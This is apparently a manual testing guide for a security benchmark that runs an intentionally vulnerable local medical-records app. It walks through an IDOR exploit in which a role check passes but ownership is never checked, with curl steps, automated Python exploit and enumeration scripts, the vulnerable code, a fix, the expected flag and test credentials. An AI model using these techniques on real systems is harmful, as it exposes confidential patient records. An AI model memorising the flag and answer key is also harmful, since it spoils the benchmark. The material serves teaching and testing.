# S7BEN-HARD-012: Manual Testing Guide

## Vulnerability: IDOR with Partial Authorization (Horizontal Privilege Escalation)

### Overview
This benchmark demonstrates a subtle authorization vulnerability where the application checks user **ROLE** but not record **OWNERSHIP**. The system appears secure with "Authorization Required" badges and role validation, but allows doctors to access ANY patient record, not just their assigned patients.

**Adversarial Tier:** Deceptive UI with security theater - access logs, role badges, and monitoring warnings that suggest robust security.

---

## Setup

```bash
cd benchmarks/S7BEN-HARD-012
make build && make up
```

Access: http://localhost:5000

---

## Understanding Partial Authorization

### What is Partial Authorization?

**Partial Authorization** occurs when:
- System checks **some** authorization criteria (e.g., user role)
- But **misses** other critical checks (e.g., resource ownership)
- Creates appearance of security while leaving vulnerability

### Example in Healthcare Context

```python
# PARTIAL AUTHORIZATION (VULNERABLE)
@app.route('/api/records/<record_id>')
def get_record(record_id):
    # ✓ Checks if user is authenticated
    if not current_user.is_authenticated:
        return "Unauthorized", 401

    # ✓ Checks if user has doctor role
    if current_user.role != 'doctor':
        return "Forbidden", 403

    # ✗ MISSING: Doesn't check if record is assigned to THIS doctor
    record = get_record_from_db(record_id)
    return jsonify(record)
```

**Result:** Any doctor can access any patient record (horizontal privilege escalation).

### Horizontal vs Vertical Privilege Escalation

- **Vertical:** User gains higher privileges (user → admin)
- **Horizontal:** User accesses resources of peers at same privilege level (doctor A → doctor B's patients)

This benchmark demonstrates **horizontal escalation**.

---

## Exploitation Steps

### Step 1: Login as Dr. Smith

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=dr_smith&password=smith2026"
```

### Step 2: List Your Assigned Records

```bash
curl -b cookies.txt http://localhost:5000/api/records | python3 -m json.tool
```

**Expected Response (Dr. Smith's assigned records):**
```json
{
  "records": [
    {
      "id": "REC-001",
      "patient_name": "John Doe",
      "diagnosis": "Hypertension",
      "sensitivity": "standard",
      "created_at": "2026-01-05T10:00:00",
      "assigned_to_you": true
    },
    {
      "id": "REC-002",
      "patient_name": "Jane Wilson",
      "diagnosis": "Diabetes Type 2",
      "sensitivity": "standard",
      "created_at": "2026-01-05T14:30:00",
      "assigned_to_you": true
    },
    {
      "id": "REC-005",
      "patient_name": "Michael Brown",
      "diagnosis": "Fractured Arm",
      "sensitivity": "standard",
      "created_at": "2026-01-07T16:20:00",
      "assigned_to_you": true
    }
  ],
  "role": "doctor",
  "authorization": "role_based_access_active"
}
```

**Note:** Only shows records assigned to dr_smith. No REC-003 or REC-004 (assigned to dr_jones).

### Step 3: Get Oracle Information

```bash
curl -b cookies.txt http://localhost:5000/api/oracle | python3 -m json.tool
```

**Expected Response:**
```json
{
  "expected_vulnerability": "partial_authorization_idor",
  "expected_exploit_path": "Login as doctor → List assigned records → Access unassigned record by ID → Horizontal escalation",
  "authorization_model": "role_based_only",
  "missing_check": "ownership_validation",
  "attack_type": "horizontal_privilege_escalation",
  "target_record": "REC-004",
  "target_assigned_to": "dr_jones",
  "hint": "System checks user ROLE but not record OWNERSHIP/ASSIGNMENT",
  "test_accounts": {
    "dr_smith": {
      "username": "dr_smith",
      "password": "smith2026",
      "assigned_records": ["REC-001", "REC-002", "REC-005"]
    },
    "dr_jones": {
      "username": "dr_jones",
      "password": "jones2026",
      "assigned_records": ["REC-003", "REC-004"]
    }
  }
}
```

**Key Insight:** REC-004 is assigned to dr_jones (highly confidential HIV record).

### Step 4: Access Dr. Jones's Patient Record (IDOR)

Even though REC-004 is NOT in your assigned list, try accessing it directly:

```bash
curl -b cookies.txt http://localhost:5000/api/records/REC-004 | python3 -m json.tool
```

**Expected Response:**
```json
{
  "status": "success",
  "record": {
    "id": "REC-004",
    "patient_name": "Emily Davis",
    "diagnosis": "CONFIDENTIAL - HIV Positive",
    "notes": "SENSITIVE: Patient requested strict privacy. Starting antiretroviral therapy. Contains flag for IDOR exploitation.",
    "assigned_doctor": "dr_jones",
    "sensitivity": "highly_confidential",
    "created_at": "2026-01-06T11:00:00"
  },
  "idor_detected": true,
  "access_logged": true
}
```

**🎯 Success!** You accessed a highly confidential record assigned to another doctor.

**ADVERSARIAL Element:** Notice `"access_logged": true` - suggests monitoring, but doesn't prevent access.

### Step 5: Retrieve Flag

```bash
curl -b cookies.txt http://localhost:5000/api/flag | python3 -m json.tool
```

**Expected Response:**
```json
{
  "status": "success",
  "flag": "S7BEN{partial_authz_idor_a1b2c3d4e5f67890abcdef1234567890}",
  "message": "Partial authorization IDOR successfully exploited!",
  "proof": {
    "record_id": "REC-004",
    "patient_name": "Emily Davis",
    "horizontal_escalation": true,
    "vulnerability": "role_checked_but_ownership_not_checked"
  }
}
```

---

## Automated Exploitation

```python
#!/usr/bin/env python3
import requests

URL = "http://localhost:5000"

print("[*] Step 1: Logging in as Dr. Smith...")
session = requests.Session()
login_resp = session.post(f"{URL}/login", data={
    "username": "dr_smith",
    "password": "smith2026"
})
print(f"[+] Login: {login_resp.json()['message']}")

print("\n[*] Step 2: Listing assigned records...")
records_resp = session.get(f"{URL}/api/records").json()
assigned_records = records_resp['records']
print(f"[+] Found {len(assigned_records)} assigned records:")
for rec in assigned_records:
    print(f"    - {rec['id']}: {rec['patient_name']}")

print("\n[*] Step 3: Getting oracle information...")
oracle = session.get(f"{URL}/api/oracle").json()
target_record = oracle['target_record']
target_assigned_to = oracle['target_assigned_to']
print(f"[+] Target record: {target_record}")
print(f"[+] Assigned to: {target_assigned_to}")
print(f"[+] Vulnerability: {oracle['missing_check']}")

print(f"\n[*] Step 4: Exploiting IDOR - accessing {target_record}...")
record_resp = session.get(f"{URL}/api/records/{target_record}").json()

if record_resp.get('status') == 'success':
    print("[+] Successfully accessed unauthorized record!")
    rec = record_resp['record']
    print(f"    Patient: {rec['patient_name']}")
    print(f"    Diagnosis: {rec['diagnosis']}")
    print(f"    Assigned to: {rec['assigned_doctor']}")
    print(f"    IDOR Detected: {record_resp.get('idor_detected')}")
    print(f"    Access Logged: {record_resp.get('access_logged')}")

print("\n[*] Step 5: Retrieving flag...")
flag_resp = session.get(f"{URL}/api/flag").json()

if flag_resp.get('status') == 'success':
    print("\n" + "="*60)
    print("✅ EXPLOITATION SUCCESSFUL!")
    print("="*60)
    print(f"\nFlag: {flag_resp['flag']}")
    print("\nProof:")
    for key, value in flag_resp['proof'].items():
        print(f"  {key}: {value}")
    print("="*60)
else:
    print(f"\n[-] Failed: {flag_resp}")
```

---

## Understanding the Vulnerability

### Vulnerable Code Analysis

```python
@app.route('/api/records/<record_id>')
def api_record(record_id):
    # Authentication check ✓
    if 'username' not in session:
        return jsonify({"error": "Authentication required"}), 401

    username = session['username']
    role = session['role']

    # Role-based check ✓
    if role not in ['doctor', 'admin']:
        return jsonify({
            "error": "Access denied",
            "message": "Only doctors and administrators can access patient records"
        }), 403

    record = RECORDS.get(record_id)

    if not record:
        return jsonify({"error": "Record not found"}), 404

    # VULNERABILITY: Missing ownership check! ✗
    # Should check: if role == 'doctor' and record['assigned_doctor'] != username
    # But it doesn't!

    # Return record regardless of assignment
    return jsonify({
        "status": "success",
        "record": record
    })
```

### Adversarial Elements

1. **Security Theater**
   - "Authorization Required" badges in UI
   - Role validation messages
   - Access logging ("All access attempts are logged and monitored")
   - These create **false sense of security**

2. **Partial Mitigation**
   - Role checks work correctly
   - Session validation works
   - But ownership validation is **missing**

3. **Misdirection**
   - Emphasis on role validation suggests complete authorization
   - Access logs imply detection prevents abuse
   - "Secure Access System" branding

---

## Prevention

### Fix: Add Ownership Validation

```python
@app.route('/api/records/<record_id>')
def api_record(record_id):
    if 'username' not in session:
        return jsonify({"error": "Authentication required"}), 401

    username = session['username']
    role = session['role']

    # Role check
    if role not in ['doctor', 'admin']:
        return jsonify({"error": "Access denied"}), 403

    record = RECORDS.get(record_id)

    if not record:
        return jsonify({"error": "Record not found"}), 404

    # FIX: Add ownership check for doctors
    if role == 'doctor' and record['assigned_doctor'] != username:
        log_unauthorized_access(username, record_id)
        return jsonify({"error": "Access denied - record not assigned to you"}), 403

    # Only return if authorized
    return jsonify({"record": record})
```

### Authorization Best Practices

1. **Always validate BOTH:**
   - Role/permission (can user perform this action?)
   - Ownership (does this resource belong to user?)

2. **Use framework authorization:**
   ```python
   # Django example
   @login_required
   @permission_required('records.view_record')
   def view_record(request, record_id):
       record = get_object_or_404(Record, pk=record_id)

       # Check ownership
       if not record.can_be_accessed_by(request.user):
           raise PermissionDenied

       return render(request, 'record.html', {'record': record})
   ```

3. **Filter queries by ownership:**
   ```python
   # Good: Filter at database level
   records = Record.objects.filter(assigned_doctor=current_user)

   # Bad: Fetch all then filter in code
   all_records = Record.objects.all()
   user_records = [r for r in all_records if r.assigned_doctor == current_user]
   ```

4. **Test authorization thoroughly:**
   - Test with different roles
   - Test accessing other users' resources
   - Test boundary conditions

---

## Alternative Attack Scenarios

### Scenario 1: Record Enumeration

```bash
# Try accessing all records sequentially
for i in {1..10}; do
    RECORD_ID="REC-$(printf "%03d" $i)"
    echo "Trying $RECORD_ID..."
    curl -s -b cookies.txt "http://localhost:5000/api/records/$RECORD_ID" | \
        python3 -c "import sys, json; d=json.load(sys.stdin); print(f'{d.get(\"record\", {}).get(\"patient_name\", \"Not found\")} - {d.get(\"idor_detected\", False)}')"
done
```

### Scenario 2: Cross-Doctor Access

```python
#!/usr/bin/env python3
import requests

URL = "http://localhost:5000"

# Login as Dr. Jones
session = requests.Session()
session.post(f"{URL}/login", data={"username": "dr_jones", "password": "jones2026"})

# Get oracle to find Dr. Smith's records
oracle = session.get(f"{URL}/api/oracle").json()
dr_smith_records = oracle['test_accounts']['dr_smith']['assigned_records']

print(f"[*] Attempting to access Dr. Smith's records as Dr. Jones...")
for record_id in dr_smith_records:
    resp = session.get(f"{URL}/api/records/{record_id}").json()
    if resp.get('status') == 'success':
        print(f"[+] Accessed {record_id}: {resp['record']['patient_name']}")
```

---

## Success Criteria

- ✅ Logged in as doctor (dr_smith)
- ✅ Listed assigned records (only shows your records)
- ✅ Identified target record assigned to another doctor
- ✅ Accessed unassigned record via direct API call
- ✅ Confirmed horizontal privilege escalation (`idor_detected: true`)
- ✅ Retrieved flag demonstrating partial authorization bypass
- ✅ Flag format: `S7BEN{partial_authz_idor_<32_hex_chars>}`

---

## Verification

```bash
curl -b cookies.txt http://localhost:5000/api/verify | python3 -m json.tool
```

**Expected:**
```json
{
  "exploitation_successful": true,
  "proof": {
    "idor_exploited": true,
    "horizontal_escalation": true,
    "unauthorized_attempts": 1,
    "accessed_records": 1,
    "vulnerability_type": "partial_authorization"
  },
  "flag": "S7BEN{partial_authz_idor_...}"
}
```

---

## Cleanup

```bash
make down && make clean
```
